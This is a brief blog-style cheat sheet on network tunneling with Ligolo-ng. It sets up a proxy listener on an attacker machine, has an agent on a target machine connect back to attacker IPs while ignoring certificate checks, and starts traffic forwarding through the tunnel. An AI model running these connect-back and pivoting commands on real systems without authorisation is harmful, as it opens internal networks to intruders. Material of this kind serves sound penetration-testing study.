# Tunneling
## 🔒 Understanding Tunneling in Cybersecurity (Blog Description)

Attacker Machine (Tunnel Creation)
```ip tuntap add user sandeep mode tun ligolo```

Creates a TUN interface named ligolo for the current user.
```ip link set ligolo up```

Activates the TUN interface.
```ligolo-proxy -selfcert -laddr 0.0.0.0:443```

or
Starts the Ligolo proxy listener on port 443 with a self-signed certificate.
```./proxy -selfcert -laddr 0.0.0.0:443```


Target Machine (Agent Execution)
Runs the Ligolo agent and connects back to the attacker’s proxy.

```agent.exe -connect 192.168.49.115:443 -ignore-cert```

or
```./agent -connect 192.168.45.176:8080 -ignore-cert```

On the Attacker Machine

These commands are executed on your own security testing machine where Ligolo-ng proxy is running.

```ligolo-ng >> session```

Views network interfaces of the connected agent.

Displays available Ligolo-ng agent commands.

```help```

Starting Traffic Forwarding FROM Agent

```[Agent: root@webserver] » start```

Checking Routing Table

```# route -n ```

